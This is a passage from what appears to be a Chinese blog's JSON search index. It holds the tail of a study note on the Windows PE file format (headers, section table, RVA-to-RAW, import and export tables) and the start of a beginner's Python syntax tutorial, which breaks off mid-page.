Machine码为14C。</p></li>\r\n<li><p>NumberOfSections表示文件中节区（代码、数据、资源等数据分为不同节区）数量。</p></li>\r\n<li><p>SizeOfOptionalHeader表示IMAGE_NT_HEADER结构体最后一个成员IMAGE_OPTIONAL_HEADER32的大小（PE装载器查看该值识别IMAGE_OPTIONAL_HEADER32结构体大小）</p>\r\n<blockquote>\r\n<p>PE32+格式文件中使用IMAGE_OPTIONAL_HEADER64结构体，两个结构体尺寸大小不同，需要SizeOfOptionalHeader表明结构体大小</p>\r\n</blockquote></li>\r\n<li><p>Characteristics 表明文件的属性，文件是否可以运行，是否为DLL文件等信息</p></li>\r\n</ol>\r\n<table>\r\n<colgroup>\r\n<col style=\"width: 35%\">\r\n<col style=\"width: 5%\">\r\n<col style=\"width: 58%\">\r\n</colgroup>\r\n<thead>\r\n<tr class=\"header\">\r\n<th>Flag</th>\r\n<th>Value</th>\r\n<th>Description</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr class=\"odd\">\r\n<td>IMAGE_FILE_RELOCS_STRIPPED</td>\r\n<td>0x0001</td>\r\n<td>Image only, Windows CE, and Microsoft Windows NT and later. This indicates that the file does not contain base relocations and must therefore be loaded at its preferred base address. If the base address is not available, the loader reports an error. The default behavior of the linker is to strip base relocations from executable (EXE) files.</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>IMAGE_FILE_EXECUTABLE_IMAGE</td>\r\n<td>0x0002</td>\r\n<td>Image only. This indicates that the image file is valid and can be run. If this flag is not set, it indicates a linker error.</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>IMAGE_FILE_LINE_NUMS_STRIPPED</td>\r\n<td>0x0004</td>\r\n<td>COFF line numbers have been removed. This flag is deprecated and should be zero.</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>IMAGE_FILE_LOCAL_SYMS_STRIPPED</td>\r\n<td>0x0008</td>\r\n<td>COFF symbol table entries for local symbols have been removed. This flag is deprecated and should be zero.</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>IMAGE_FILE_AGGRESSIVE_WS_TRIM</td>\r\n<td>0x0010</td>\r\n<td>Obsolete. Aggressively trim working set. This flag is deprecated for Windows 2000 and later and must be zero.</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>IMAGE_FILE_LARGE_ADDRESS_AWARE</td>\r\n<td>0x0020</td>\r\n<td>Application can handle &gt; 2-GB addresses.</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td></td>\r\n<td>0x0040</td>\r\n<td>This flag is reserved for future use.</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>IMAGE_FILE_BYTES_REVERSED_LO</td>\r\n<td>0x0080</td>\r\n<td>Little endian: the least significant bit (LSB) precedes the most significant bit (MSB) in memory. This flag is deprecated and should be zero.</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>IMAGE_FILE_32BIT_MACHINE</td>\r\n<td>0x0100</td>\r\n<td>Machine is based on a 32-bit-word architecture.</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>IMAGE_FILE_DEBUG_STRIPPED</td>\r\n<td>0x0200</td>\r\n<td>Debugging information is removed from the image file.</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>}IMAGE_FILE_REMOVABLE_RUN_ FROM_SWAP</td>\r\n<td>0x0400</td>\r\n<td>If the image is on removable media, fully load it and copy it to the swap file.</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>IMAGE_FILE_NET_RUN_FROM_SWAP</td>\r\n<td>0x0800</td>\r\n<td>If the image is on network media, fully load it and copy it to the swap file.</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>IMAGE_FILE_SYSTEM</td>\r\n<td>0x1000</td>\r\n<td>The image file is a system file, not a user program.</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>IMAGE_FILE_DLL</td>\r\n<td>0x2000</td>\r\n<td>The image file is a dynamic-link library (DLL). Such files are considered executable files for almost all purposes, although they cannot be directly run.</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>IMAGE_FILE_UP_SYSTEM_ONLY</td>\r\n<td>0x4000</td>\r\n<td>The file should be run only on a uniprocessor machine.</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>IMAGE_FILE_BYTES_REVERSED_HI</td>\r\n<td>0x8000</td>\r\n<td>Big endian: the MSB precedes the LSB in memory. This flag is deprecated and should be zero.</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p>000000e0: 5045 0000 4c01 0300 8752 0248 0000 0000 PE..L....R.H.... 000000f0: 0000 0000 e000 0f01 0b01 070a 0078 0000 .............x..</p>\r\n<h4 id=\"nt头可选头\">NT头：可选头</h4>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class=\"line\">    DWORD VirtualAddress;</span><br><span class=\"line\">    DWORD Size;</span><br><span class=\"line\">&#125;IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> IMAGE_NUMBER_DIRECTORY_ENTRIES 16</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class=\"line\">    WORD Magic; <span class=\"comment\">// IMAGE_OPTIONAL_HEADER32时为10B，IMAGE_OPTIONAL_HEADER64时为20B，</span></span><br><span class=\"line\">    BYTE MajorLinkerVersion;</span><br><span class=\"line\">    BYTE MinorLinkerVersion;</span><br><span class=\"line\">    DWORD SizeOfCode;</span><br><span class=\"line\">    DWORD SizeOfInitializedData;</span><br><span class=\"line\">    DWORD SizeOfUninitializedData;</span><br><span class=\"line\">    DWORD AddressOfEntryPoint;  <span class=\"comment\">// 持有EP的RVA值，指出程序最先执行的代码起始地址</span></span><br><span class=\"line\">    DWORD BaseOfCode;</span><br><span class=\"line\">    DOWRD BaseOfData;</span><br><span class=\"line\">    DWORD ImageBase;  <span class=\"comment\">// PE文件被加载到内存时，表示文件优先装入地址</span></span><br><span class=\"line\">    DWORD SectionAlignment;  <span class=\"comment\">// 指定节区在内存中的最小单位</span></span><br><span class=\"line\">    DWORD FileAlignment; <span class=\"comment\">// 指定节区在磁盘文件中的最小单位</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    DWORD SizeOfImage;  <span class=\"comment\">// 指定PE Image在虚拟内存中所占空间大小，一般而言，文件大小与加载到内存中大小不同</span></span><br><span class=\"line\">    DWORD SizeOfHeaders; <span class=\"comment\">// 指出整个PE头大小，必须为FileAlignment整数倍，第一节区所在位置距文件开始偏移量相同</span></span><br><span class=\"line\">    WORD Subsystem;  <span class=\"comment\">// 区分系统驱动文件与普通可执行文件</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    DWORD NumberOfRvaAndSizes;  <span class=\"comment\">// 指定DataDirectory数组个数</span></span><br><span class=\"line\">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class=\"line\">&#125;IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>\r\n<p>DataDirectory数组内容如下：</p>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">DataDirectory[0] = EXPORT Directory</span><br><span class=\"line\">DataDirectory[1] = IMPORT Directory</span><br><span class=\"line\">DataDirectory[2] = RESOURCE Directory</span><br><span class=\"line\">DataDirectory[3] = EXCEPTION Directory</span><br><span class=\"line\">DataDirectory[4] = SECURITY Directory</span><br><span class=\"line\">DataDirectory[5] = BASERELOC Directory</span><br><span class=\"line\">DataDirectory[6] = DEBUG Directory</span><br><span class=\"line\">DataDirectory[7] = COPYRIGHT Directory</span><br><span class=\"line\">DataDirectory[8] = GLOBALPTR Directory</span><br><span class=\"line\">DataDirectory[9] = TLS Directory</span><br><span class=\"line\">DataDirectory[A] = LOAD_CONFIG Directory</span><br><span class=\"line\">DataDirectory[B] = BOUND_IMPORT Directory</span><br><span class=\"line\">DataDirectory[C] = IAT Directory</span><br><span class=\"line\">DataDirectory[D] = DELAY_IMPORT Directory</span><br><span class=\"line\">DataDirectory[E] = COM_DESCRIPTOR Directory</span><br><span class=\"line\">DataDirectory[F] = Reserved Directory</span><br></pre></td></tr></table></figure>\r\n<p>重点关注EXPORT/IMPORT/RESOURCE/TLS Direction</p>\r\n<h4 id=\"节区头\">节区头</h4>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> IMAGE_SIZEOF_SHORT_NAME     8</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class=\"line\">    BYTE Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> </span></span><br><span class=\"line\"><span class=\"class\">    &#123;</span></span><br><span class=\"line\">        DWORD PhysicalAddress;</span><br><span class=\"line\">        DWORD VirtualSize; <span class=\"comment\">// 内存中节区所占大小</span></span><br><span class=\"line\">    &#125; Misc;</span><br><span class=\"line\">    DWORD VirtualAddress; <span class=\"comment\">// 内存中节区起始地址（RVA）</span></span><br><span class=\"line\">    DWORD SizeOfRawData; <span class=\"comment\">// 磁盘文件中节区所占大小</span></span><br><span class=\"line\">    DWORD PointerToRawData; <span class=\"comment\">// 磁盘文件中节区起始位置</span></span><br><span class=\"line\">    DWORD PointerToRelocations;</span><br><span class=\"line\">    DWORD PointerToLinenumbers;</span><br><span class=\"line\">    WORD NumberOfRelocations;</span><br><span class=\"line\">    WORD NumberOfLinenumbers;</span><br><span class=\"line\">    DWORD Characteristics; <span class=\"comment\">// 节区属性</span></span><br><span class=\"line\">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>\r\n<p>节区头定义了各节区属性。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> IMAGE_SCN_CNT_CODE                  0x00000020</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> IMAGE_SCN_CNT_INITIALIZED_DATA      0x00000040</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> IMAGE_SCN_CNT_UNINITIALIZED_DATA    0x00000080</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> IMAGE_SCN_MEM_EXECUTE               0x20000000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> IMAGE_SCN_MEM_READ                  0x40000000  <span class=\"comment\">// section is readable</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> IMAGE_SCN_MEM_WRITE                 0x80000000      <span class=\"comment\">// section is writable</span></span></span><br></pre></td></tr></table></figure>\r\n<h3 id=\"rva-to-raw\">RVA to RAW</h3>\r\n<p>内存地址与文件偏移的映射称为 RVA to RAW，方法如下：</p>\r\n<ol type=\"1\">\r\n<li>查找RVA所在节区</li>\r\n<li>使用公式计算文件偏移</li>\r\n</ol>\r\n<blockquote>\r\n<p>RAW-PointerToRawData = RVA - VirtualAddress RAW = RVA - VirtualAddress + PointerToRawData</p>\r\n</blockquote>\r\n<p>两者相对之差+文件偏移基址 = RAW</p>\r\n<h3 id=\"pe体\">PE体</h3>\r\n<h4 id=\"导入表\">导入表</h4>\r\n<p><strong>IMAGE_IMPORT_DESCRIPTOR</strong> IMAGE_IMPORT_DESCRIPTOR结构体记录PE文件需导入哪些库文件。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">        DWORD Characteristics;</span><br><span class=\"line\">        DWORD OriginalFirstThunk; <span class=\"comment\">// INT(Import Name Table) address (RAV)</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    DWORD TimeDateStamp;</span><br><span class=\"line\">    DWORD ForwarderChain;</span><br><span class=\"line\">    DWORD Name;                 <span class=\"comment\">// library name string address (RAV)</span></span><br><span class=\"line\">    DWORD FirstThunk;           <span class=\"comment\">// IAT(Import Address Table) address (RAV)</span></span><br><span class=\"line\">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class=\"line\">    WORD Hint;    <span class=\"comment\">// ordinal</span></span><br><span class=\"line\">    BYTE NAME[<span class=\"number\">1</span>]; <span class=\"comment\">// function name string</span></span><br><span class=\"line\">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>\r\n<p>PE文件往往需要导入多个库，导入多少个库就需要多少个IMAGE_IMPORT_DESCRIPTOR结构体构成的数组，以NULL结构体结束，其中结构体重要成员如下：</p>\r\n<ul>\r\n<li>OriginalFirstThunk：INT地址（RAV）</li>\r\n<li>Name：库名字字符串地址（RAV）</li>\r\n<li>FirstThunk：IAT地址（RAV）</li>\r\n</ul>\r\n<blockquote>\r\n<p>注：INT中各元素的值为IMAGE_IMPORT_BY_NAME结构体指针。</p>\r\n</blockquote>\r\n<p>PE装载器把导入函数输入至IAT顺序：</p>\r\n<ol type=\"1\">\r\n<li>读取IID的Name成员，获取字符串；(\"kernel32.dll\")</li>\r\n<li>装载相应库；（LoadLibrary(\"kernel32.dll\"）</li>\r\n<li>读取IID中OriginalFirstThunk成员，获取INT地址；</li>\r\n<li>逐一读取INT中数组的值，获取IMAGE_IMPORT_BY_NAME地址；</li>\r\n<li>使用IMAGE_IMPORT_BY_NAME的hint（ordinal）或Name成员，获取相应函数起始地址。（GetProcAddress(\"GetCurrentThreadld\"）</li>\r\n<li>读取IID中FirstThunk成员，获取IAT地址。</li>\r\n<li>将第5步获得的地址填入第6步得到的IAT数组中。</li>\r\n<li>重复步骤4-7，直到INT结束。</li>\r\n</ol>\r\n<p>IID位于PE体中，但其位置信息位于PE头中，IMAGE_OPTIONAL_HEADERXX.DataDirectory[1].VirutalAddress的值为IID数组起始地址（RAV）。</p>\r\n<h4 id=\"导出表\">导出表</h4>\r\n<p>EAT是windows方便其他程序调用库相关函数的核心机制，通过EAT才能准确从相应库中求得导出函数的起始地址。PE内 <code>IMAGE_EXPORT_DESCRIPTOR</code> 结构体保存着导出信息，且仅有一个该结构体。</p>\r\n<p><strong>IMAGE_EXPORT_DESCRIPTOR</strong> IMAGE_EXPORT_DESCRIPTOR结构体代码如下所示：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_EXPORT_DESCRIPTOR</span> &#123;</span></span><br><span class=\"line\">    DWORD Characteriscs;</span><br><span class=\"line\">    DWORD TimeDateStamp;</span><br><span class=\"line\">    WORD MajorVerion;</span><br><span class=\"line\">    WORD MinorVerion;</span><br><span class=\"line\">    DWORD NAME;               <span class=\"comment\">// address of library name</span></span><br><span class=\"line\">    DWORD Base;               <span class=\"comment\">// ordinal base</span></span><br><span class=\"line\">    DWORD NumberOfFunctions;  <span class=\"comment\">// number of function;</span></span><br><span class=\"line\">    DWORD NumberoOfNames;     <span class=\"comment\">// number of name;</span></span><br><span class=\"line\">    DWORD AddrssOfFunctions;  <span class=\"comment\">// address of function start address</span></span><br><span class=\"line\">    DWORD AddressOfNames;     <span class=\"comment\">// address of function name string array</span></span><br><span class=\"line\">    DWORD AddressOfNameOrdinals; <span class=\"comment\">// address of ordinal array</span></span><br><span class=\"line\">&#125; IMAGE_EXPORT_DESCRIPTOR, *PIMAGE_EXPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>\r\n<p>其中重要成员如下：</p>\r\n<ul>\r\n<li>NumberOfFunctions：实际Export函数的个数</li>\r\n<li>NumberOfNames：Export函数中具名函数的个数</li>\r\n<li>AddressOfFunctions：Export函数地址数组</li>\r\n<li>AddessOfNames：函数名称地址数组</li>\r\n<li>AddesssOfOrdinals：Ordinal地址数组</li>\r\n</ul>\r\n<p>GetProcAddress()操作原理：</p>\r\n<ol type=\"1\">\r\n<li>利用AddressOfNames转到函数名称数组；</li>\r\n<li>逐个便历数组，获取字符串，与参数进行比较，相同时得到索引（name_index)</li>\r\n<li>通过AddressOfNameOrdinals转到Ordinal地址数组；</li>\r\n<li>在ordinal数组中通过name_index得到ordinal值；</li>\r\n<li>利用AddressOfFunctions成员转到“函数地址数组”（EAT）</li>\r\n<li>在EAT中使用ordinal作为索引，获得指定函数地址。</li>\r\n</ol>\r\n","categories":["逆向工程核心原理"],"tags":["reverse","book"]},{"title":"Python 基础","url":"/2022/09/13/Python-%E5%9F%BA%E7%A1%80/","content":"<h2 id=\"什么是python\">什么是Python</h2>\r\n<p>Python 是一种解释型、交互式、面向对象、动态数据类型的高级程序设计语言。</p>\r\n<ul>\r\n<li>解释：无需编译，解释执行</li>\r\n<li>交互式：可以在一个 Python 提示符 &gt;&gt;&gt; 后直接执行代码</li>\r\n<li>面向对象：支持面向对象的风格或代码封装在对象</li>\r\n</ul>\r\n<span id=\"more\"></span>\r\n<h2 id=\"第一个python程序\">第一个Python程序</h2>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Hello World!&quot;</span>)</span><br></pre></td></tr></table></figure>\r\n<p>以上命令输出结果为：<code>Hello World!</code></p>\r\n<h2 id=\"python语言的编写\">Python语言的编写</h2>\r\n<ol type=\"1\">\r\n<li><p>写成Python脚本<code>xx.py</code>，然后在命令行中使用<code>python xx.py</code>即可运行，可重复使用。</p>\r\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">cat</span> test.py</span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Hello World!&quot;</span>)</span><br><span class=\"line\">$ python test.py</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">$ </span><br></pre></td></tr></table></figure></p></li>\r\n<li><p>在python解释器中编写，随时运行</p></li>\r\n</ol>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Hello World!&quot;</span>)</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>\r\n<h2 id=\"语法基础\">语法基础</h2>\r\n<h3 id=\"标识符\">标识符</h3>\r\n<p>标识符用作变量命名，需满足以下规则：</p>\r\n<ul>\r\n<li>第一个字符必须是字母表中字母或下划线<code>_</code></li>\r\n<li>标识符其他部分由字母、数字、下划线组成</li>\r\n<li>标识符对大小写敏感</li>\r\n<li>Python3中支持中文作为变量名（非ASCII标识符）</li>\r\n</ul>\r\n<h3 id=\"保留字\">保留字</h3>\r\n<p>保留字即关键字，不能用作任何标识符名称，可使用如下命令查看标识符。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">import</span> keyword</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">print</span>(keyword.kwlist)</span><br><span class=\"line\">[<span class=\"string\">&#x27;False&#x27;</span>, <span class=\"string\">&#x27;None&#x27;</span>, <span class=\"string\">&#x27;True&#x27;</span>, <span class=\"string\">&#x27;and&#x27;</span>, <span class=\"string\">&#x27;as&#x27;</span>, <span class=\"string\">&#x27;assert&#x27;</span>, <span class=\"string\">&#x27;async&#x27;</span>, <span class=\"string\">&#x27;await&#x27;</span>, <span class=\"string\">&#x27;break&#x27;</span>, <span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;continue&#x27;</span>, <span class=\"string\">&#x27;def&#x27;</span>, <span class=\"string\">&#x27;del&#x27;</span>, <span class=\"string\">&#x27;elif&#x27;</span>, <span class=\"string\">&#x27;else&#x27;</span>, <span class=\"string\">&#x27;except&#x27;</span>, <span class=\"string\">&#x27;finally&#x27;</span>, <span class=\"string\">&#x27;for&#x27;</span>, <span class=\"string\">&#x27;from&#x27;</span>, <span class=\"string\">&#x27;global&#x27;</span>, <span class=\"string\">&#x27;if&#x27;</span>, <span class=\"string\">&#x27;import&#x27;</span>, <span class=\"string\">&#x27;in&#x27;</span>, <span class=\"string\">&#x27;is&#x27;</span>, <span class=\"string\">&#x27;lambda&#x27;</span>, <span class=\"string\">&#x27;nonlocal&#x27;</span>, <span class=\"string\">&#x27;not&#x27;</span>, <span class=\"string\">&#x27;or&#x27;</span>, <span class=\"string\">&#x27;pass&#x27;</span>, <span class=\"string\">&#x27;raise&#x27;</span>, <span class=\"string\">&#x27;return&#x27;</span>, <span class=\"string\">&#x27;try&#x27;</span>, <span class=\"string\">&#x27;while&#x27;</span>, <span class=\"string\">&#x27;with&#x27;</span>, <span class=\"string\">&#x27;yield&#x27;</span>]</span><br><span class=\"line\">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"注释\">注释</h3>\r\n<p>单行注释以 <code>#</code> 开头，在该行<code>#</code>后的所有内容会被python解释器忽略</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># the first comment </span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Hello, Python!&quot;</span>) <span class=\"comment\"># the second comment</span></span><br></pre></td></tr></table></figure>\r\n<p>多行注视可以使用 <code>'''</code>和<code>\"\"\"</code></p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">The first line</span></span><br><span class=\"line\"><span class=\"string\">The second line</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">The third line</span></span><br><span class=\"line\"><span class=\"string\">The forth line</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Hello Python!&quot;</span>)</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"行与缩进\">行与缩进</h3>\r\n<p>Python使用缩进表示代码块，无需使用 <code>&#123;</code>和<code>&#125;</code>，缩进空格数是可变的，但是同一个代码块的语句必须包含相同的缩进空格数。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 正确用法</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;True&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;False&quot;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 错误用法</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">  <span class=\"built_in\">print</span>(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"number\">3</span>)</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"基本类型\">基本类型</h3>\r\n<p>基本类型共有6种，分别为：</p>\r\n<ul>\r\n<li>数字</li>\r\n<li>字符串</li>\r\n<li>列表（list）</li>\r\n<li>元组（tuple）</li>\r\n<li>集合（set）</li>\r\n<li>字典（dict） 其中可变数据有：列表、字典、集合 不可变有：数字、字符串、元组 可以使用<code>type()</code>函数查看数据类型</li>\r\n</ul>\r\n<h4 id=\"数字\">数字</h4>\r\n<p>python共有4种数字类型</p>\r\n<ol type=\"1\">\r\n<li>int（整型），例如 1，2，3</li>\r\n<li>bool（布尔），仅包含True和False（其中True为1，False为0）</li>\r\n<li>float（浮点），例如 1.23，2E-3</li>\r\n<li>complex（复数），例如 1+2j，2.1-4.5j 数字运算如下：</li>\r\n</ol>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">5</span> + <span class=\"number\">4</span>  <span class=\"comment\"># 加法</span></span><br><span class=\"line\"><span class=\"number\">9</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">4.3</span> - <span class=\"number\">2</span> <span class=\"comment\"># 减法</span></span><br><span class=\"line\"><span class=\"number\">2.3</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">3</span> * <span class=\"number\">7</span>  <span class=\"comment\"># 乘法</span></span><br><span class=\"line\"><span class=\"number\">21</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">2</span> / <span class=\"number\">4</span>  <span class=\"comment\"># 除法，得到一个浮点数</span></span><br><span class=\"line\"><span class=\"number\">0.5</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">2</span> // <span class=\"number\">4</span> <span class=\"comment\"># 除法，得到一个整数</span></span><br><span class=\"line\"><span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">17</span> % <span class=\"number\">3</span> <span class=\"comment\"># 取余</span></span><br><span class=\"line\"><span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">2</span> ** <span class=\"number\">5</span> <span class=\"comment\"># 乘方</span></span><br><span class=\"line\"><span class=\"number\">32</span></span><br></pre></td></tr></table></figure>\r\n<h4 id=\"字符串\">字符串</h4>\r\n<ul>\r\n<li>python中单引号<code>'</code>和双引号<code>\"</code>作用相同</li>\r\n</ul>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = <span class=\"string\">&#x27;sss&#x27;</span></span><br><span class=\"line\">b = <span class=\"string\">&quot;sss&quot;</span></span><br></pre></td></tr></table></figure></p>\r\n<ul>\r\n<li>三引号可以指定（<code>'''</code>或<code>\"\"\"</code>）一个多行字符串</li>\r\n</ul>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">hello</span></span><br><span class=\"line\"><span class=\"string\">world</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\"> hello</span></span><br><span class=\"line\"><span class=\"string\"> python</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></p>\r\n<ul>\r\n<li>转义符<code>\\</code>，转义的含义是将转义符后的第一个字符进行特殊处置</li>\r\n</ul>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = <span class=\"string\">&#x27;hello\\nworld&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">print</span>(s)</span><br><span class=\"line\">hello</span><br><span class=\"line\">world</span><br><span class=\"line\">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p>\r\n<ul>\r\n<li>字符串使用 + 运算符进行连接</li>\r\n</ul>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = <span class=\"string\">&#x27;hello &#x27;</span></span><br><span class=\"line\">b = <span class=\"string\">&#x27;python&#x27;</span></span><br><span class=\"line\">c = a + b   <span class=\"comment\"># c 为 &#x27;hello python&#x27;</span></span><br></pre></td></tr></table></figure></p>\r\n<ul>\r\n<li>字符串索引从0或-1开始，从左至右以<code>0</code>开始，从右至左以<code>-1</code>开始</li>\r\n</ul>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s = <span class=\"string\">&#x27;hello world&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(s[<span class=\"number\">4</span>])    <span class=\"comment\"># 输出为o</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(s[-<span class=\"number\">2</span>])   <span class=\"comment\"># 输出为l</span></span><br></pre></td></tr></table></figure></p>\r\n<figure>\r\n<img src=\"/2022/09/13/Python-%E5%9F%BA%E7%A1%80/image-20220913154815147.png\" alt=\"image-20220913154815147\"><figcaption 